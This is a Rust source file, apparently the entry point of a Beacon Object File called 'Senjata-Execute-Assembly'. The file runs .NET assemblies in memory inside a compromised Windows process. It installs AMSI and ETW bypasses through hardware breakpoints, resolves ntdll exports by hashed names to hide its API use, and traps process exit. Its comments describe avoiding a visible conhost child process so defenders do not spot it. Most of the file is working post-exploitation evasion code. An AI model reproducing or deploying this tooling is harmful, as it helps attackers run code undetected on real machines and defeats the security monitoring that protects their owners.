//! Senjata-Execute-Assembly BOF — entry point.
#![no_std]

pub mod args;
#[cfg(target_os = "windows")]
pub use clr_orchestrator::cleanup;
#[cfg(target_os = "windows")]
pub use clr_orchestrator::dispatch as clr;
#[cfg(target_os = "windows")]
pub use clr_orchestrator::netfx as clr_netfx;
#[cfg(target_os = "windows")]
pub use clr_orchestrator::core as clr_core;
#[cfg(target_os = "windows")]
pub mod error;
#[cfg(target_os = "windows")]
pub use clr_orchestrator::io;
pub use clr_orchestrator::pe_parser;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    #[cfg(target_os = "windows")]
    {
        match run(args, len) {
            Ok(()) => rustbof::eprintln!("[+] senjata-execute-assembly finished"),
            Err(e) => rustbof::eprintln!("[-] {}", e.format()),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (args, len);
    }
}

#[cfg(target_os = "windows")]
fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
    use error::BofError;
    let a = args::parse(raw_args, len).map_err(BofError::Args)?;
    unsafe {
        // NOTE: We do NOT call AllocConsole here. On Win10+ AllocConsole
        // spawns `conhost.exe` as a child process, which is visible in
        // the process tree and may trigger child-process injection if
        // the operator has spawnto persistence configured. Instead, we
        // rely on `io::IoChannel` to SetStdHandle to a named pipe before
        // CLR initialization — Console.WriteLine writes to that handle
        // without ever needing a console window object.
        //
        // Multi-file mode (a.mode == 1) skips PE parsing — the input is a
        // bundle, not a single assembly. Caller is responsible for binary
        // compatibility. Single-file mode parses normally.
        rustbof::eprintln!("[dbg] senjata: args ok amsi={} etw={} mode={}", a.amsi as u8, a.etw as u8, a.mode);

        let asm_info = if a.mode == 1 {
            pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
        } else {
            pe_parser::parse(&a.asm_bytes).map_err(|e| BofError::Orchestrator(match e {
                pe_parser::Error::MixedMode => clr_orchestrator::OrchestratorError::MixedModeUnsupported,
                pe_parser::Error::ArchMismatch => clr_orchestrator::OrchestratorError::ArchMismatch,
                other => clr_orchestrator::OrchestratorError::PeParse(other),
            }))?
        };

        rustbof::eprintln!("[dbg] pe parse ok");
        let engine = opsec_hwbp::HwbpEngine::init()
            .map_err(|e| BofError::Orchestrator(clr_orchestrator::OrchestratorError::Hwbp(e)))?;
        rustbof::eprintln!("[dbg] hwbp engine ok");
        let _bypasses = clr_orchestrator::bypasses::install(&engine, a.amsi, a.etw)
            .map_err(BofError::Orchestrator)?;

        rustbof::eprintln!("[dbg] opening io channel mailslot={}", a.mailslot as u8);
        let mut io_ch = io::IoChannel::open(a.mailslot, &a.slot_name, &a.pipe_name)?;
        rustbof::eprintln!("[dbg] io channel open ok");
        // DIAG: snapshot stdio state right after IoChannel::open.
        // If std != w here, our SetStdHandle didn't stick.
        rustbof::eprintln!(
            "[dbg] stdio after_open std={:#x} w={:#x} saved={:#x}",
            io_ch.current_stdout() as isize,
            io_ch.write_handle() as isize,
            io_ch.saved_stdout() as isize,
        );

        // save_cleanup_point acts like setjmp: exit-trap VEH redirects back here.
        // There are two paths back to the code after this block:
        //   A) Assembly's Main() returns normally → dispatch() returns, falls through.
        //   B) Assembly calls Environment.Exit() → RtlExitUserProcess HWBP fires,
        //      RIP/RSP redirected back to this label, invoked==true, if-block skipped.
        // drain() must run in BOTH paths, so it lives outside the if-block.
        let mut invoked = false;
        let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
        if !invoked {
            invoked = true;

            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
            let exit_target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exit_h))
                .ok_or(BofError::Orchestrator(
                    clr_orchestrator::OrchestratorError::PebResolve {
                        module_hash: ntdll_h,
                        export_hash: exit_h,
                    },
                ))?;
            let _exit_trap = engine
                .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                .map_err(|e| BofError::Orchestrator(
                    clr_orchestrator::OrchestratorError::Hwbp(e),
                ))?;

            rustbof::eprintln!("[dbg] dispatch start");
            let dispatch_result = clr::dispatch(
                &asm_info, &a.asm_bytes,
                &a.app_domain, &a.asm_args, a.entry_point,
                a.mode, &a.main_name,
                io_ch.write_handle() as usize,
            );
            rustbof::eprintln!("[dbg] dispatch returned path=A ok={}", dispatch_result.is_ok() as u8);
            // DIAG: snapshot stdio AFTER dispatch returns. If std now differs
            // from w (or matches saved), something during CLR init reset it.
            rustbof::eprintln!(
                "[dbg] stdio after_dispatch std={:#x} w={:#x} saved={:#x}",
                io_ch.current_stdout() as isize,
                io_ch.write_handle() as isize,
                io_ch.saved_stdout() as isize,
            );
            // DIAG: write directly to write_handle right before drain. If
            // "[RUST_END]" appears in drained text, the pipe is still healthy
            // — proving the managed→pipe disconnect is purely Console-side.
            io_ch.diag_write(b"\n[RUST_END]\n");
            // Path A: normal Main() return.
            if let Ok(output) = io_ch.drain() {
                rustbof::eprintln!("[dbg] drain A bytes={}", output.len());
                if !output.is_empty() {
                    rustbof::eprintln!("\n{}", output);
                }
            }
            dispatch_result?;
        }
        // Path B: Environment.Exit() trap jumped here. Also a no-op for path A.
        rustbof::eprintln!("[dbg] drain B start");
        if let Ok(output) = io_ch.drain() {
            rustbof::eprintln!("[dbg] drain B bytes={}", output.len());
            if !output.is_empty() {
                rustbof::eprintln!("\n{}", output);
            }
        }
        let _ = invoked;
    }
    Ok(())
}
